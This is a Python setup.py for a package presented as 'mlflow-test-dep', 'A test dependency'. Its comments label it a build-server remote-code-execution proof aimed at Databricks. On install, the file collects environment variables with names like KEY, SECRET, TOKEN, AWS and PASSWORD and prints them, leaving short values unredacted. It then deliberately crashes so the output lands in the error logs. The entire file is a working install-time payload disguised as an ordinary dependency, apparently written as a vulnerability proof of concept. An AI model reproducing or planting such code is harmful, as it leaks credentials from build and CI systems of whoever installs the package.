import os
from setuptools import setup

# 1. Gather environment variables, focusing on sensitive keys
sensitive_keys = ['KEY', 'SECRET', 'TOKEN', 'AWS', 'DATABRICKS', 'PASSWORD', 'CREDENTIAL', 'GCP', 'AZURE']
env_vars = {}

for k, v in os.environ.items():
    if any(x in k.upper() for x in sensitive_keys):
        # Redact long values to be safe, but prove the key exists
        env_vars[k] = "***REDACTED***" if len(v) > 10 else v

# 2. Build the proof payload
proof = "🚨🚨🚨 BUILD_SERVER_RCE_PROOF 🚨🚨🚨\n"
proof += f"Working Directory: {os.getcwd()}\n"
proof += f"Sensitive ENV Vars Found: {env_vars}\n"

# Print it so it shows up in standard output logs
print(proof)

# 3. Intentionally crash to guarantee this payload is in the Databricks error logs
raise Exception(proof)

# (This line is never reached, but required for valid setup.py syntax)
setup(
    name="mlflow-test-dep",
    version="0.1",
    description="A test dependency"
)
